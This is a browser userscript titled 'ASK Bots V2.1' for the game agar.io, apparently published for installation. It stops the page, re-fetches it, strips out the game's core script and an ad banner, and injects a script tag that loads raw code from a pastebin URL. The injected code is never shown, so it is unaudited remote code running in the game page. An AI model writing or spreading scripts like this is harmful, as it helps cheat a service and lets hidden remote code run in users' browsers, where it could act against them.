// ==UserScript==
// @name         ASK Bots V2.1
// @namespace    ASK
// @version      2.1
// @description  Agar.io bots after patch.
// @author       ASK TEAM
// @match        http://agar.io/*
// @exclude      http://agar.io/agario.core.js
// @exclude      http://agar.io/mc/agario.js
// @exclude      http://agar.io/js/master.js
// @exclude      http://agar.io/main_out.js
// @run-at       document-start
// @grant        GM_xmlhttpRequest
// @downloadURL https://update.greasyfork.org/scripts/32135/ASK%20Bots%20V21.user.js
// @updateURL https://update.greasyfork.org/scripts/32135/ASK%20Bots%20V21.meta.js
// ==/UserScript==

let unlimitedJS = `<script src="https://pastebin.com/raw/3N9WyeeV" charset="utf-8"></script>`;
function inject(page) {
  page = page.replace(/<script.*?src=".*?agario\.core\.js.*?><\/script>/, '');
  page = page.replace(/<div.*?id=".*?adsBottom.*?><\/div>/, '');
  page = page.replace(/<h2>Agar.io/gi, '<h3>Ask Bots');
  page = page.replace(/<\/body>/, `${unlimitedJS}</body>`);
  return page;
}

window.stop();
document.documentElement.innerHTML = '';
GM_xmlhttpRequest({
  method : 'GET',
  url : 'http://agar.io/',
  onload : function(e) {
 document.open();
 document.write(inject(e.responseText));
 document.close();
  }
});